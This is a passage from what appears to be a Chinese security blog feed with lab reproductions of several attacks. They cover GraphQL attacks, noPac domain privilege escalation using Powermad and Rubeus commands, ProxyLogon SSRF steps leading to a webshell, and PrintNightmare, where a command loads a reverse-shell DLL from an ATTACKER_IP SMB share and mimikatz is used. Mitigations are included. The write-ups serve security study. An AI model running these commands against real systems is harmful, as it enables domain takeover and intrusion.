title="防御方式：增加深度限制，使用graphql-depth-limit模块查询数量限制；或者使用graphql-input-number创建一个标量，设置最大为100"></a>防御方式：增加深度限制，使用graphql-depth-limit模块查询数量限制；或者使用graphql-input-number创建一个标量，设置最大为100</h3><h2 id="6、CSRF"><a href="#6、CSRF" class="headerlink" title="6、CSRF"></a>6、CSRF</h2><p>修改原先json格式的post内容，假如GraphQL的端点支持将query语句使用传参的方式，将Content-Type修改为application/x-www-form-urlencoded，就有可能存在CSRF</p><p>偷一下P牛的ppt</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.4/pic-20220713/image_gGPZFrFw73.png"></p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.4/pic-20220713/image_7oD4wsctZg.png"></p><h2 id="7、SQL注入"><a href="#7、SQL注入" class="headerlink" title="7、SQL注入"></a>7、SQL注入</h2><p>GraphQL的注入感觉有点鸡肋，可以参考内省查询的接口，在参数后拼接另外一个query或者mutation。</p><p>一般要是直接能拿到GraphQL端点，直接使用可用的query或者mutation查询即可，也就不存在SQL注入这一说了。</p><p>假设场景接收用户传参，GraphQL的接口不对外开放，参数在拼接成完整的GraphQL语句之后进行查询，那么如果没有做好参数恶意过滤，那么参数就可拼接一个完整的查询或者更改达成SQL注入了。</p><p>继续偷一下P牛的PPT，主要注意下GraphQL的语法问题，拼接后能够友好执行</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.4/pic-20220713/image_hwaE_Aj8da.png"></p><h2 id="8、接口权限问题"><a href="#8、接口权限问题" class="headerlink" title="8、接口权限问题"></a>8、接口权限问题</h2><p>使用内省查询获取的接口如果缺乏鉴权，就可被攻击者越权利用获取数据或者权限。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://graphql.cn/learn/schema/" title="https://graphql.cn/learn/schema/">https://graphql.cn/learn/schema/</a></p><p><a href="https://blog.assetnote.io/2021/08/29/exploiting-graphql/" title="https://blog.assetnote.io/2021/08/29/exploiting-graphql/">https://blog.assetnote.io/2021/08/29/exploiting-graphql/</a></p><p><a href="https://xzfile.aliyuncs.com/upload/zcon/2018/7_%E6%94%BB%E5%87%BBGraphQL_phithon.pdf" title="https://xzfile.aliyuncs.com/upload/zcon/2018/7_攻击GraphQL_phithon.pdf">https://xzfile.aliyuncs.com/upload/zcon/2018/7_攻击GraphQL_phithon.pdf</a></p><p><a href="https://juejin.cn/post/7012133339037450271#heading-11" title="https://juejin.cn/post/7012133339037450271#heading-11">https://juejin.cn/post/7012133339037450271#heading-11</a></p>]]></content>
      
      
      <categories>
          
          <category> Web渗透学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透 </tag>
            
            <tag> GraphQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-42287/CVE-2021-42278 域权限提升</title>
      <link href="/2021/12/17/cve-2021-42287-cve-2021-42278-yu-quan-xian-ti-sheng/"/>
      <url>/2021/12/17/cve-2021-42287-cve-2021-42278-yu-quan-xian-ti-sheng/</url>
      
        <content type="html"><![CDATA[<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Windows Server 2022</p><p>Windows Server 2019</p><p>Windows Server 2016</p><p>all editions Windows Server 2012 R2</p><p>Windows Server 2012</p><p>Windows Server 2008 R2</p><p>Windows Server 2008 Service Pack 2</p><h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>CVE-2021-42287/CVE-2021-42278 samAccountName spoofing</p><h3 id="CVE-2021-42287"><a href="#CVE-2021-42287" class="headerlink" title="CVE-2021-42287"></a>CVE-2021-42287</h3><p>机器账户的名字一般来说应该以<code>$</code>结尾，但AD没有对域内机器账户名做验证，这就导致攻击者可通过利用计算机账户sAMAccountName欺骗来模仿域控</p><p>正常机器账户如下，非法的如dctest：</p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic for samAccountName spoofing/image.png" alt="img" style="zoom:50%;"><h3 id="CVE-2021-42278"><a href="#CVE-2021-42278" class="headerlink" title="CVE-2021-42278"></a>CVE-2021-42278</h3><p>在 kerberos 认证过程中，用户要访问某个服务，在获取服务票据 ST 之前，需要申请 TGT票据。该漏洞的核心为：当请求的服务票 ST 没有被 KDC 找到时，KDC 会自动在尾部添加 <code>$</code> 重新搜索。</p><p><strong>将上述漏洞进行结合利用进行域内权限提升，流程如下：</strong></p><ol><li>建立一个机器账户，并修改账户的<code>sAMAccountName</code>为域控的机器账户名，例如域控机器名为DC$，这里建立的机器账户<code>sAMAccountName</code>则修改为DC；</li><li>使用该账户向KDC的AS申请到TGT；</li><li>修改1中建立的机器账户的<code>sAMAccountName</code>修改为其他名，不与DC相同即可；</li><li>使用2中申请到的TGT，利用<a href="https://cloud.tencent.com/developer/article/1802247">S4U2self</a>协议向KDC申请用于访问域控服务（ldap等）的ST。KDC服务一般默认安装在域控中，且此时DC这个<code>sAMAccountName</code>已经不存在了，这就导致在向域控的KDC申请ST的时候，域控找不到DC这个账户。又因为漏洞CVE-2021-42278的缘故 ，找不到DC账户的KDC会在<code>sAMAccountName</code>名后添加<code>$</code>继续搜索，即在Account Database 中寻找DC账户。这样因为域控名为DC是存在的，KDC就会用域控密钥签发用于访问攻击主机服务的高权限ST；</li><li>DCsync，攻击达成。</li></ol><blockquote><p>前提：需要对属性 <code>sAMAccountName</code> 和 <code>servicePrincipalName</code> 具有写权限。由于默认情况下 <a href="https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota">MAQ</a> 特性，域内普通用户可以创建 10 个机器账户，而创建者对于机器账户具有写权限，当然可以更改这两个属性。</p></blockquote><h2 id="12月28日补充"><a href="#12月28日补充" class="headerlink" title="12月28日补充"></a>12月28日补充</h2><p>看了长亭师傅们的分析，有些细节需要补充下</p><ul><li>KDC在查找用户信息主要有三个流程，因为机器名缺少<code>$</code>导致进入2流程：</li></ul><p><strong>（1）</strong>、查找传入用户信息；</p><p><strong>（2）</strong>、(1)中查找失败后拼接<code>$</code>继续查找；</p><p><strong>（3）</strong>、(2)中查找失败则继续查找altSecurityIdentities属性的value</p><ul><li>在进行到利用S4U2self协议申请ST的时候，原先以为S4U2self协议只能转发用户TGT申请用于访问自己服务的TGT。后来发现该协议好像没有想象中的严格，申请的ST对象可以随意更换，所以有了域控账户的PAC之后通过S4U2self协议就可以申请访问域内任意服务的ST</li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>本地测试环境：</p><ul><li>域名<code>aaron.com</code></li><li>域控win2012r2(<code>172.16.84.5</code>)，sAMAccountName:<code>WIN-K0LG8TT3AGH$</code>，域控administrator</li><li>域主机win10(<code>172.16.84.4</code>),sAMAccountName:<code>WINDOWS10$</code>，登录名win10</li></ul><h3 id="一、使用武器化工具noPac"><a href="#一、使用武器化工具noPac" class="headerlink" title="一、使用武器化工具noPac"></a>一、使用武器化工具<a href="https://github.com/cube0x0/noPac">noPac</a></h3><p><strong>1.使用域内账户验证是否存在漏洞</strong></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">noPac.exe scan -domain DOMAIN.COM -user USERNAME -pass PASSWORD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic for samAccountName spoofing/image1.png" alt="img" style="zoom:50%;"><p><strong>2.攻击达成</strong></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">noPac.exe -domain DOMAIN.COM -user USERNAME -pass PASSWORD /dc MACHINENAME.DOMAIN.COM /mAccount dctest /mPassword 1qaz2wsx /service cifs /ptt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic for samAccountName spoofing/image 2.png" alt="img" style="zoom:50%;"><p>测试成功</p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic for samAccountName spoofing/image 3.png" alt="img" style="zoom:50%;"><h3 id="二、使用Powermad和Rubeus"><a href="#二、使用Powermad和Rubeus" class="headerlink" title="二、使用Powermad和Rubeus"></a>二、使用<a href="https://github.com/Kevin-Robertson/Powermad">Powermad</a>和<a href="https://github.com/GhostPack/Rubeus">Rubeus</a></h3><h4 id="修改powershell的执行策略，倒入ps1脚本，创建机器账户test"><a href="#修改powershell的执行策略，倒入ps1脚本，创建机器账户test" class="headerlink" title="修改powershell的执行策略，倒入ps1脚本，创建机器账户test"></a><strong>修改powershell的执行策略，倒入ps1脚本，创建机器账户test</strong></h4><pre class="line-numbers language-PowerShell" data-language="PowerShell"><code class="language-PowerShell">Set-ExecutionPolicy unRestrictedNew-MachineAccount -MachineAccount test -Domain aaron.com -DomainController WIN-K0LG8TT3AGH.aaron.com -Verbose<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic for samAccountName spoofing/image4.png" alt="img" style="zoom:67%;"><p>查看创建成功</p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic for samAccountName spoofing/image5.png" alt="img" style="zoom:50%;"><h4 id="删除该账户的SPN记录"><a href="#删除该账户的SPN记录" class="headerlink" title="删除该账户的SPN记录"></a><strong>删除该账户的SPN记录</strong></h4><p>查询发现该账户存在SPN记录</p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic for samAccountName spoofing/image6.png" alt="img" style="zoom:50%;"><p>使用脚本<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">powerview</a>删除</p><pre class="line-numbers language-PowerShell" data-language="PowerShell"><code class="language-PowerShell">Set-DomainObject "CN=test,CN=Computers,DC=aaron,DC=com" -Clear 'serviceprincipalname' -Verbose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic for samAccountName spoofing/image7.png" alt="img" style="zoom:67%;"><p>查看发现SPN记录已经被删除</p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic for samAccountName spoofing/image8.png" alt="img" style="zoom:50%;"><h4 id="重新设置机器名，与域控机器名相同，去除"><a href="#重新设置机器名，与域控机器名相同，去除" class="headerlink" title="重新设置机器名，与域控机器名相同，去除$"></a>重新设置机器名，与域控机器名相同，去除<code>$</code></h4><pre class="line-numbers language-PowerShell" data-language="PowerShell"><code class="language-PowerShell">Set-MachineAccountAttribute -MachineAccount test -Value "WIN-K0LG8TT3AGH" -Attribute samaccountname -Verbose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic for samAccountName spoofing/image9.png" alt="img" style="zoom:50%;"><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic for samAccountName spoofing/image10.png" alt="img" style="zoom:50%;"><p>此时机器账户test的<code>sAMAccountName</code>值已经变成域控的对应值缺少<code>$</code></p><h4 id="使用Rubeus请求TGT"><a href="#使用Rubeus请求TGT" class="headerlink" title="使用Rubeus请求TGT"></a><strong>使用Rubeus请求TGT</strong></h4><pre class="line-numbers language-PowerShell" data-language="PowerShell"><code class="language-PowerShell">Rubeus.exe asktgt /user:WIN-K0LG8TT3AGH /password:PASSWORD /domian:aaron.com /dc:WIN-K0LG8TT3AGH.aaron.com /nowrap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic for samAccountName spoofing/image11.png" alt="img" style="zoom:67%;"><h4 id="恢复账户属性"><a href="#恢复账户属性" class="headerlink" title="恢复账户属性"></a><strong>恢复账户属性</strong></h4><pre class="line-numbers language-PowerShell" data-language="PowerShell"><code class="language-PowerShell">Set-MachineAccountAttribute -MachineAccount test -Value "test" -Attribute samaccountname -Verbose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic for samAccountName spoofing/image12.png" alt="img" style="zoom:67%;"><h4 id="Request-S4U2self（获取票据）"><a href="#Request-S4U2self（获取票据）" class="headerlink" title="Request S4U2self（获取票据）"></a><strong>Request S4U2self（获取票据）</strong></h4><pre class="line-numbers language-text" data-language="text"><code class="language-text">Rubeus.exe s4u /impersonateuser:Administrator /nowrap /dc:WIN-K0LG8TT3AGH.aaron.com /self /altservice:LDAP/WIN-K0LG8TT3AGH.aaron.com /ptt /ticket:上面生成的ticket或者可签发CIFS的票据Rubeus.exe s4u /impersonateuser:Administrator /nowrap /dc:WIN-K0LG8TT3AGH.aaron.com /self /altservice:cifs/WIN-K0LG8TT3AGH.aaron.com /ptt /ticket:上面生成的ticket<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic for samAccountName spoofing/image13.png" alt="img" style="zoom:67%;"><p>查看内存中的票据，发现已经存在 dc 的 ldap和cifs 服务票据：</p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic for samAccountName spoofing/image14.png" alt="img" style="zoom:50%;"><p>测试是否有效</p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic for samAccountName spoofing/image15.png" alt="img" style="zoom:50%;"><p>后面可以利用高权限的票据Dcsync</p><h2 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h2><ol><li>微软官方已推出补丁：KB5008602、KB5008380</li><li>通过域控的 ADSI 编辑器工具将 AD 域的 MAQ 配置为 0，中断此漏洞的利用链。</li></ol><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://mp.weixin.qq.com/s/5KpyNsbSyeOPqOXYjfmtxw">https://mp.weixin.qq.com/s/5KpyNsbSyeOPqOXYjfmtxw</a></p>]]></content>
      
      
      <categories>
          
          <category> windows内网 </category>
          
          <category> CVE-2021 </category>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
            <tag> 域渗透 </tag>
            
            <tag> 提权 </tag>
            
            <tag> Kerberos协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-26855 proxylogon复现</title>
      <link href="/2021/08/30/cve-2021-26855-proxylogon-fu-xian/"/>
      <url>/2021/08/30/cve-2021-26855-proxylogon-fu-xian/</url>
      
        <content type="html"><![CDATA[<h4 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h4><p>CVE-2021-26855又名proxylogon，是利用ssrf绕过权限验证，再结合同期Exchange的其他漏洞例如文件写入（<strong>CVE-2021-27065</strong>）等漏洞进行无权限rce</p><h4 id="受害版本"><a href="#受害版本" class="headerlink" title="受害版本"></a>受害版本</h4><p>Exchange 2013 Versions &lt; 15.00.1497.012</p><p>Exchange 2016 CU18 &lt; 15.01.2106.013</p><p>Exchange 2016 CU19 &lt; 15.01.2176.009</p><p>Exchange 2019 CU7 &lt; 15.02.0721.013</p><p>Exchange 2019 CU8 &lt; 15.02.0792.010</p><h4 id="具体过程如下："><a href="#具体过程如下：" class="headerlink" title="具体过程如下："></a>具体过程如下：</h4><p>1、 通过SSRF漏洞攻击,访问autodiscover.xml泄露LegacyDN信息<br>2、 在通过LegacyDN, 获取SID<br>3.、然后通过合法的SID,获取exchange的有效cookie<br>4.、最后通过有效的cookie,对OABVirtualDirectory对象进行恶意操作，写入一句话木马，达到控制目标的效果.</p><h4 id="漏洞复现环境"><a href="#漏洞复现环境" class="headerlink" title="漏洞复现环境"></a>漏洞复现环境</h4><p>win2012r2+exchange 2016cu16.iso</p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h5><p>漏洞探测包：</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/CVE_repaly@1.0/CVE-2021/pic/CVE2021-26855-1.png"></p><p>ssrf原因为请求包中的cookie中X-BEResource，存在漏洞主机会有<strong>X-FEServer和X-CalculatedBETarget</strong>两个cookie。其中需要X-FEServer的信息进行进一步利用</p><h5 id="读取-autodiscover-xml"><a href="#读取-autodiscover-xml" class="headerlink" title="读取 autodiscover.xml"></a>读取 autodiscover.xml</h5><p>Autodiscover(自动发现)是自Exchange Server 2007开始推出的一项自动服务，用于自动配置用户在Outlook中邮箱的相关设置，简化用户登陆使用邮箱的流程。如果用户账户是域账户且当前位于域环境中，通过自动发现功能用户无需输入任何凭证信息即可登陆邮箱。</p><p>读取对应账户的legacyDN</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/CVE_repaly@1.0/CVE-2021/pic/CVE2021-26855-2.png"></p><h5 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h5><p><a href="https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/tree/master/Exchange/CVE-2021-26855%20Exchange%20RCE">https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/tree/master/Exchange/CVE-2021-26855%20Exchange%20RCE</a></p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/CVE_repaly@1.0/CVE-2021/pic/CVE2021-26855-3.png"></p><h4 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h4><p>有幸在内网实战碰见后端三台负载的exchange存在proxylogon，且由于环境限制纯手工复现一番，这里把出现的坑一一列出：</p><h5 id="1、16进制问题"><a href="#1、16进制问题" class="headerlink" title="1、16进制问题"></a>1、16进制问题</h5><p>在读取完legacyDn后需要通过legacyDn拼接16进制：<code>\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00</code>进行发包读取sid，这里python脚本会自动转换，但是手动burp发包的话则需要一个个字节编辑</p><h5 id="2、后端负载情况下的FQDN"><a href="#2、后端负载情况下的FQDN" class="headerlink" title="2、后端负载情况下的FQDN"></a>2、后端负载情况下的FQDN</h5><p>常见的proxylogon的脚本都会通过读取返回包头中的<code>X-FEServer</code>字段也就是域内主机名，而后在通过请求包的cookie字段<code>X-BEResource</code>对该主机的444端口的接口进行ssrf利用，例如：</p><p><code>X-BEResource: Admin@WIN-DC:444/mapi/emsmdb?MailboxId=f26bc937-b7b3-4402-b890-96c46713e5d5@exchange.lab&amp;a=~1942062522;</code></p><p>实战过程中通过<code>X-FEServer</code>读取的值而后利用ssrf并不能访问，在读取sid的步骤中返回的是500状态码</p><p>而后通过试错，利用返回包中的<code>X-CalculatedBETarget</code>的字段值，也就是负载的其中一台exchange域内主机名进行ssrf访问444端口的接口成功</p><h5 id="3、读取OAB-ID失败"><a href="#3、读取OAB-ID失败" class="headerlink" title="3、读取OAB ID失败"></a>3、读取OAB ID失败</h5><p>常见的exp在获取ASP.NET_SessionId和msExchEcpCanary之后，再尝试获取OAB ID使用的接口为</p><p><code>/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&amp;msExchEcpCanary=%s&amp;a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s</code></p><p>而在上次的实战中，使用该接口返回包中<strong>Identity</strong>的值一直为null，在渗透测试最后一天的下午又找到一个exp，使用的接口为：</p><p><code>/ecp/DDI/DDIService.svc/GetList?schema=VirtualDirectory&amp;msExchEcpCanary={msExchEcpCanary}&amp;#~1941962754; ASP.NET_SessionId={sessid}; msExchEcpCanary={msExchEcpCanary}</code></p><p>最终成功读取OAB ID，并写入webshell，附上该exp 的链接：<a href="https://github.com/hosch3n/ProxyVulns/blob/main/26855.py">https://github.com/hosch3n/ProxyVulns/blob/main/26855.py</a></p><h5 id="4、请求包头缺失"><a href="#4、请求包头缺失" class="headerlink" title="4、请求包头缺失"></a>4、请求包头缺失</h5><p>因为特别是从读取sid后的几步，比对了很多exp的，详细的exp能比简易的exp多出3个请求头字段，且都验证有效、必需。</p>]]></content>
      
      
      <categories>
          
          <category> Microsoft Exchange </category>
          
          <category> CVE-2021 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Exchange </tag>
            
            <tag> SSRF </tag>
            
            <tag> Proxylogon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-1675复现</title>
      <link href="/2021/07/20/cve-2021-1675-fu-xian/"/>
      <url>/2021/07/20/cve-2021-1675-fu-xian/</url>
      
        <content type="html"><![CDATA[<h2 id="1、漏洞危害"><a href="#1、漏洞危害" class="headerlink" title="1、漏洞危害"></a>1、漏洞危害</h2><p>CVE-2021-1675（后分配至编号<strong>CVE-2021-34527</strong>）这个漏洞级别属于稍次于<strong>Zerologon</strong>的打域利器之一。和以往的打印机协议中继/委派系列，危害度和利用条件基本在同一维度</p><p>影响版本</p><pre class="line-numbers language-none"><code class="language-none">Windows Server 2019Windows Server 2016Windows Server 2012 R2Windows Server 2012Windows Server 2008 R2Windows Server 2008<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、漏洞利用条件"><a href="#2、漏洞利用条件" class="headerlink" title="2、漏洞利用条件"></a>2、漏洞利用条件</h2><ul><li>一个域内账户密码或者该机器账户密码</li><li>驱动器的绝对路径</li></ul><h2 id="3、复现步骤"><a href="#3、复现步骤" class="headerlink" title="3、复现步骤"></a>3、复现步骤</h2><h4 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>漏洞环境安装存在问题的移步</p><pre class="line-numbers language-none"><code class="language-none">域控：windows server2019（172.16.84.7）域主机：windows server2012R2（172.16.84.6）攻击机：kali（172.16.84.3）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="漏洞脚本利用"><a href="#漏洞脚本利用" class="headerlink" title="漏洞脚本利用"></a>漏洞脚本利用</h4><h5 id="1）使用rpcdump扫描漏洞指纹"><a href="#1）使用rpcdump扫描漏洞指纹" class="headerlink" title="1）使用rpcdump扫描漏洞指纹"></a>1）使用rpcdump扫描漏洞指纹</h5><p>使用impacket包中的<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py">rpcdump.py</a> 查看漏洞指纹，一般返回包含MS-RPRN或者MS-PAR则该主机可能存在漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.1/pic/image-20210723173253186.png" alt="image-20210723173253186"></p><h5 id="2）漏洞前期环境部署"><a href="#2）漏洞前期环境部署" class="headerlink" title="2）漏洞前期环境部署"></a>2）漏洞前期环境部署</h5><p>需要使用smb服务放置恶意dll文件供受害主机读取，这里在攻击机上配置samba服务</p><p>创建共享文件夹/home/share后，修改samba的smb.conf文件，在结尾添加配置：</p><pre class="line-numbers language-none"><code class="language-none">[share]    path=/home/share    available = yes    browseable = yes    public = yes    writable = yes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>保存后重新启动smbd服务</p><p>恶意dll使用cs生成的dll测试即可，生成后存放至smb的共享文件夹中</p><p>关于是否需要确保域控能直接访问到该smb文件这个点上，笔者还是不太明确，看了几个文章，都在强调需要DC能直接访问到smb，但是笔者自己环境测试的DC为windows server2019，补丁更新到了2019年3月，实际是做了安全策略控制的，导致访问smb会提示“不能访问共享文件夹”，如下：</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.1/pic/image-20210723182033487.png" alt="image-20210723182033487"></p><p>此DC仍然能够使用exp成功打出，咱们继续往下看</p><h5 id="3）漏洞利用"><a href="#3）漏洞利用" class="headerlink" title="3）漏洞利用"></a>3）漏洞利用</h5><h6 id="本地提权使用"><a href="#本地提权使用" class="headerlink" title="本地提权使用"></a><strong>本地提权使用</strong></h6><p>微软先前提供的补丁仅仅针对该漏洞的本地提权的恶意利用方式进行修补，选用脚本来自：<a href="https://github.com/calebstewart/CVE-2021-1675">https://github.com/calebstewart/CVE-2021-1675</a> ，这里就不复现了</p><h6 id="Python脚本利用"><a href="#Python脚本利用" class="headerlink" title="Python脚本利用"></a><strong>Python脚本利用</strong></h6><p>cs生成64位的dll，上传至smb后，确保DC和域主机能ping通我们的smb服务器，下面安装<a href="https://github.com/cube0x0/CVE-2021-1675">exp</a>需要的环境。</p><p>由于该exp作者对impacket包进行了部分修改，所以需要卸载原先安装的impacket环境，用<a href="https://github.com/cube0x0/impacket">修改后的impacket</a></p><pre class="line-numbers language-none"><code class="language-none">pip3 uninstall impacketgit clone https://github.com/cube0x0/impacketcd impacketpython3 ./setup.py install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>安装后，使用域主机账户密码进行漏洞利用：</p><p><code>python3 CVE-2021-1675.py &lt;FQDN&gt;/&lt;USER_Name&gt;:&lt;PASSWORD&gt;@&lt;DC IP&gt; '\\&lt;ATTACKER_IP&gt;\smb\rev.dll'</code></p><p>如下：</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.1/pic/image-20210723182804857.png" alt="image-20210723182804857"></p><p>cs上获取域控的会话：</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.2/pic/image-20210723183220532.png" alt="image-20210723183220532"></p><h6 id="mimikatz利用"><a href="#mimikatz利用" class="headerlink" title="mimikatz利用"></a><strong>mimikatz利用</strong></h6><p>利用mimikatz对漏洞进行复现</p><p>命令：</p><pre class="line-numbers language-none"><code class="language-none">misc::printnightmare /library:\\172.16.84.3\share\artifact.dll /server:172.16.84.7 /authuser:&lt;域主机用户&gt; /authdomain:&lt;域名&gt; /authpassword:&lt;域主机密码&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于使用dll为原生cs的dll，这里日常报毒查杀</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.2/pic/image-20210830111551285.png" alt="image-20210830111551285"></p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.2/pic/image-20210830110707554.png"></p><p>本文仅仅测试可行性，这里添加白名单继续执行，成功上线</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.2/pic/image-20210830120926159.png" alt="image-20210830120926159"></p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.2/pic/image-20210830113130749.png" alt="image-20210830113130749"></p><h4 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h4><p>原先测试环境为DC windows server2012R2，虽然域控能够访问开启的smb服务且前期指纹探测确认存在漏洞，但是使用python脚本进行实际攻击下一直提示rpc_s_access_denied，具体原因不是很明确（猜测为windows自己的杀毒进程阻拦），原github同样存在类似问题反馈<a href="https://github.com/cube0x0/CVE-2021-1675/issues/9">https://github.com/cube0x0/CVE-2021-1675/issues/9</a></p><h2 id="4、修复建议"><a href="#4、修复建议" class="headerlink" title="4、修复建议"></a>4、修复建议</h2><p>建议关闭Spooler服务</p><pre class="line-numbers language-none"><code class="language-none">//cmdnet stop spooler &amp;&amp; sc config spooler start=disabled //powershellStop-Service SpoolerREG ADD  "HKLM\SYSTEM\CurrentControlSet\Services\Spooler"  /v "Start" /t REG_DWORD /d "4" /f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或：</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.2/pic/image-20210830121139370.png" alt="image-20210830121139370"></p><h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3><p>1、<a href="https://github.com/cube0x0/CVE-2021-1675">https://github.com/cube0x0/CVE-2021-1675</a></p><p>2、<a href="https://mp.weixin.qq.com/s/k4OwCcJJxm-UHMdVdfBCIw">https://mp.weixin.qq.com/s/k4OwCcJJxm-UHMdVdfBCIw</a></p><p>3、<a href="https://zhuanlan.zhihu.com/p/386251108">https://zhuanlan.zhihu.com/p/386251108</a></p><p>4、<a href="https://github.com/calebstewart/CVE-2021-1675">https://github.com/calebstewart/CVE-2021-1675</a></p>]]></content>
      
      
      <categories>
          
          <category> windows内网 </category>
          
          <category> CVE-2021 </category>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
            <tag> 域渗透 </tag>
            
            <tag> PrintNightmare </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网初探-windows hash提取</title>
      <link href="/2021/07/01/nei-wang-chu-tan-windows-hash-ti-qu/"/>
      <url>/2021/07/01/nei-wang-chu-tan-windows-hash-ti-qu/</url>
      
